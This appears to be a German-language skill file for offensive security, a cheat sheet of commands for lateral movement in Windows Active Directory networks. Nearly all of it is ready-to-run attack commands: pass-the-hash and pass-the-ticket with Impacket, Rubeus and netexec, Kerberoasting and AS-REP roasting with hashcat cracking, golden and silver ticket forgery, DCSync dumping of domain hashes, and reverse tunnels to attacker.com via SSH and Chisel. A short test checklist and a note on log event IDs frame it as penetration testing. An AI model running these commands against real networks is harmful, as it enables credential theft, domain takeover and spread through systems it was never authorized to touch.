---
name: lateral-movement
description: Lateral Movement – Techniken zur Ausbreitung in Netzwerken nach initialem Zugriff
version: 1.0.0
---

# Lateral Movement

## 概述 (Übersicht)

Lateral Movement bezeichnet Techniken, die Angreifer verwenden, um sich nach dem initialen Zugriff
im Netzwerk auszubreiten. Ziel ist die Kompromittierung weiterer Systeme, Eskalation zu
Domain-Admin-Rechten und Zugriff auf kritische Ressourcen (Domain Controller, Fileserver, Datenbanken).

## Voraussetzungen

Vor Lateral Movement benötigt man typischerweise:
- Gültige Credentials (Passwort, NTLM-Hash oder Kerberos-Ticket)
- Netzwerkzugang zum Zielsystem
- Passende Ports offen (SMB 445, RDP 3389, WinRM 5985, SSH 22)

## Credential-basiertes Lateral Movement

### Pass-the-Hash (PtH)

```bash
# NTLM-Hash aus Mimikatz extrahieren
# sekurlsa::logonpasswords -> NTLM: 8846f7eaee8fb117ad06bdd830b7586c

# SMB PtH (psexec)
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  DOMAIN/Administrator@192.168.1.100

# WMI PtH
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
  -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  DOMAIN/Administrator@192.168.1.100 "whoami"

# SMB PtH via netexec (alle Systeme im Subnetz testen)
netexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# RDP PtH (Restricted Admin Mode erforderlich)
xfreerdp /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /v:192.168.1.100 /cert:ignore
```

### Pass-the-Ticket (PtT)

```bash
# Kerberos-Ticket aus Memory exportieren (Mimikatz)
# sekurlsa::tickets /export
# -> [0;12345]-0-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi

# Ticket importieren (Mimikatz)
# kerberos::ptt [0;12345]-0-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi

# Via Rubeus – Ticket dumpen
Rubeus.exe dump /luid:0x3e4 /nowrap

# Via Rubeus – Ticket injizieren
Rubeus.exe ptt /ticket:base64encodedticket

# Via Impacket – mit Ticket-Datei
export KRB5CCNAME=/tmp/admin.ccache
python3 psexec.py -k -no-pass CORP/Administrator@dc.corp.local
```

### Overpass-the-Hash (OPtH)

```bash
# NTLM-Hash zu TGT konvertieren (Mimikatz)
# sekurlsa::pth /user:admin /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c

# Via Rubeus
Rubeus.exe asktgt /user:admin /rc4:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local /ptt

# TGT anfordern und speichern
Rubeus.exe asktgt /user:admin /rc4:<hash> /domain:corp.local /outfile:admin.kirbi
```

## Kerberos-Angriffe

### AS-REP Roasting

```bash
# Konten ohne Kerberos Pre-Auth identifizieren und Hashes extrahieren

# Impacket
python3 GetNPUsers.py corp.local/ -usersfile /tmp/users.txt \
  -format hashcat -outputfile /tmp/asrep_hashes.txt -dc-ip 192.168.1.10

# Mit Credentials (umfangreichere Ergebnisse)
python3 GetNPUsers.py corp.local/normaluser:pass \
  -request -format hashcat -outputfile /tmp/asrep_hashes.txt

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Hash cracken
hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting

```bash
# Service-Account-Hashes extrahieren

# Impacket
python3 GetUserSPNs.py corp.local/user:pass -dc-ip 192.168.1.10 \
  -request -outputfile /tmp/kerberoast.txt

# Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:kerb_hashes.txt

# Spezifischen Account angreifen
Rubeus.exe kerberoast /user:sqlsvc /format:hashcat

# Hash cracken
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

### Golden Ticket

```bash
# Voraussetzung: KRBTGT-Hash (via DCSync)
python3 secretsdump.py corp.local/Administrator:pass@dc.corp.local \
  -just-dc-user krbtgt

# Domain SID ermitteln
python3 getPac.py corp.local/user:pass@dc.corp.local

# Golden Ticket erstellen (Impacket)
python3 ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... \
  -domain corp.local FakeAdmin

export KRB5CCNAME=FakeAdmin.ccache
python3 psexec.py -k -no-pass corp.local/FakeAdmin@dc.corp.local

# Rubeus Golden Ticket
Rubeus.exe golden /rc4:<krbtgt_hash> /domain:corp.local \
  /sid:S-1-5-21-... /user:FakeAdmin /ptt
```

### Silver Ticket

```bash
# Service-spezifisches TGS fälschen (kein DC-Kontakt erforderlich)

# Impacket Silver Ticket
python3 ticketer.py -nthash <machine_or_service_hash> \
  -domain-sid S-1-5-21-... -domain corp.local \
  -spn cifs/server.corp.local Administrator

# Rubeus Silver Ticket
Rubeus.exe silver /service:cifs/server.corp.local \
  /rc4:<hash> /user:Admin /domain:corp.local /ptt

# CIFS-Zugriff auf Server
ls \\server.corp.local\C$
```

### DCSync (Domain Credential Dump)

```bash
# Domain-Replication-Rechte ausnutzen (Domain Admin oder spezifische Delegation)

# Impacket secretsdump
python3 secretsdump.py -just-dc corp.local/DomainAdmin:pass@dc.corp.local

# Einzelnen Account dumpen
python3 secretsdump.py -just-dc-user Administrator corp.local/DomainAdmin:pass@dc.corp.local

# Alle NTDS.dit-Hashes
python3 secretsdump.py corp.local/DomainAdmin:pass@dc.corp.local \
  -outputfile /tmp/domain_hashes
```

## Netzwerk-Pivoting

### SSH-Tunneling & Port-Forwarding

```bash
# Local Port Forward (Angreifer greift auf internes Ziel zu)
ssh -L 8080:internal.host:80 user@pivot.host

# Remote Port Forward (Dienst von intern nach außen)
ssh -R 8080:127.0.0.1:8080 user@attacker.com

# Dynamic (SOCKS5-Proxy)
ssh -D 1080 user@pivot.host
# ProxyChains konfigurieren und nutzen:
proxychains nmap -sT 10.10.10.0/24

# Multi-Hop SSH
ssh -J pivot1.host -D 1080 user@pivot2.host
```

### Chisel Pivoting

```bash
# Server auf Angreifer
chisel server --port 8080 --reverse

# Client auf kompromittiertem System (Reverse SOCKS)
chisel client attacker.com:8080 R:1080:socks

# Direkt auf Pivot (normaler SOCKS)
chisel client attacker.com:8080 socks

# Port-Forward (Dienst von intern erreichbar machen)
chisel client attacker.com:8080 R:3389:internal.host:3389
```

### sshuttle (Transparentes VPN-Pivoting)

```bash
# Internes Netz komplett routen
sshuttle -r user@pivot.host 10.10.10.0/24 192.168.1.0/24 --dns

# Alle Tools funktionieren direkt ohne proxychains
nmap -sT 10.10.10.100
curl http://10.10.10.100/admin
```

## Remote Execution

### SMB-basierte Execution

```bash
# PsExec (SMB + Service)
python3 psexec.py corp.local/admin:pass@192.168.1.100 "cmd /c whoami"

# SMBExec (keine Dateien auf Disk)
python3 smbexec.py corp.local/admin:pass@192.168.1.100

# ATExec (Scheduled Task)
python3 atexec.py corp.local/admin:pass@192.168.1.100 "whoami"
```

### WMI-basierte Execution

```bash
# WMIExec
python3 wmiexec.py corp.local/admin:pass@192.168.1.100 "whoami"

# netexec WMI
netexec wmi 192.168.1.100 -u admin -p pass -x "whoami"
```

### WinRM (PowerShell Remoting)

```bash
# netexec WinRM
netexec winrm 192.168.1.100 -u admin -p pass -x "Get-Process"

# Evil-WinRM
evil-winrm -i 192.168.1.100 -u Administrator -p Password123
```

## Active Directory Enumeration für Lateral Movement

```bash
# BloodHound – Angriffspfade visualisieren
bloodhound-python -u user -p pass -d corp.local -c All --zip

# NetExec – Netzwerk-Sweep
netexec smb 192.168.1.0/24 -u admin -p pass --shares
netexec smb 192.168.1.0/24 -u admin -p pass --local-auth

# Lokale Admins auf allen Systemen
netexec smb 192.168.1.0/24 -u admin -p pass --local-group "Administrators"

# Logged-in User
netexec smb 192.168.1.0/24 -u admin -p pass --sessions --loggedon-users
```

## Testcheckliste

### Credential-basiert
- [ ] NTLM-Hashes aus Memory extrahiert (Mimikatz/Impacket)
- [ ] Pass-the-Hash gegen Zielsysteme getestet
- [ ] Kerberoasting durchgeführt und Hashes gecrackt
- [ ] AS-REP Roasting auf schwache Konten geprüft
- [ ] DCSync-Rechte geprüft

### Netzwerk-Pivoting
- [ ] Interne Netzwerksegmente identifiziert
- [ ] SOCKS-Proxy via Chisel/SSH eingerichtet
- [ ] ProxyChains für weitere Tools konfiguriert
- [ ] Interne Systeme via Pivot gescannt

### Remote Execution
- [ ] SMB-Zugriff via PsExec/SMBExec getestet
- [ ] WMI-Execution verifiziert
- [ ] WinRM-Zugang geprüft
- [ ] RDP-Zugang via PtH getestet

## Wichtige Hinweise

- Lateral Movement hinterlässt Log-Einträge (Event ID 4624, 4625, 4648)
- Restricted Admin Mode für RDP-PtH erforderlich
- DCSync benötigt Replication-Rechte (nicht nur Domain Admin)
- Kerberoasting-Hashes offline cracken (kein Netzwerk-Traffic zum DC)
